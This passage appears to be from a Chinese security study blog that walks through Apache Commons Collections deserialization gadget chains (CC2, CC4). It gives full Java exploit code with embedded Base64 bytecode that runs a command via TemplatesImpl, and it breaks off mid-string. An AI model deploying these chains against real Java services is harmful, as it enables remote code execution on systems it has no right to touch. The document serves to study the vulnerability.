class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射设置 Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>调用栈</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">      -&gt;mapProxy.entrySet().iterator()  <span class="comment">//动态代理类</span></span><br><span class="line">          -&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                    -&gt;ConstantTransformer.transform()</span><br><span class="line">                        -&gt;InstantiateTransformer.transform()</span><br><span class="line">                            -&gt;TrAXFilter.TrAXFilter()</span><br><span class="line">                                -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                                    -&gt;…………</span><br></pre></td></tr></table></figure></div><h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><p>利用条件比较苛刻：首先 CommonsCollections3 中无法使用，因为其 TransformingComparator 无法序列化。其次只有 CommonsCollections4-4.0 可以使用，因为 CommonsCollections4 其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p><p>这里需要引入两个新的类，首先是 PriorityQueue 部分关键代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PriorityQueue</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractQueue</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] queue;   <span class="comment">//关键点，可以传入 TemplatesImpl</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;? <span class="built_in">super</span> E&gt; comparator;     <span class="comment">//关键点可以反射设置我们自己的 Comparator</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//关键点，反序列化时字段执行的 readObject</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//关键点，调用 heapify() 排序</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//跟进 heapify() 方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//跟进 siftDown 方法，如果 comparator 不为空，调用 siftDownUsingComparator</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//跟进 siftDownUsingComparator 方法，可以看到这里调用了我们自定义的 Comparator</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)    <span class="comment">//关键点</span></span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以看到其反序列化时调用 readObject 方法，然后最终会调用 我们自定义的 Comparator 的 compare 方法</p><h4 id="自定义Comparator"><a href="#自定义Comparator" class="headerlink" title="自定义Comparator"></a>自定义Comparator</h4><p>借助 TransformingComparator 类，可以看到其 Comparator 方法中会调用 this.transformer.transform()。这是一个关键点，毕竟拿到 Transformer.transform() 就什么都好说。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3456940356043606220L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;O&gt; decorated;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? <span class="keyword">extends</span> <span class="title class_">O</span>&gt; transformer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="comment">//关键点</span></span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>CC2</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//字节码</span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射设置 Field</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//为了执行 templates.newTransformer</span></span><br><span class="line">            <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TransformingComparator 实例</span></span><br><span class="line">            <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//PriorityQueue 实例</span></span><br><span class="line">            <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class="line">            priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">            priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射设置 Field</span></span><br><span class="line">            Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, objects);</span><br><span class="line">            setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//测试反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射设置 Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>调用栈</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;InvokerTransformer.transform()</span><br><span class="line">                        -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                        -&gt;…………</span><br></pre></td></tr></table></figure></div><h3 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h3><p><strong>测试环境</strong>：4.0，jdk7u21及以前</p><p>CC4 只是将 CC2 中的 InvokerTransformer 替换为了 InstantiateTransformer</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//与cc2类似</span></span><br><span class="line"><span class="comment">//InvokeTransformer 变为 InstantiateTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//字节码</span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAA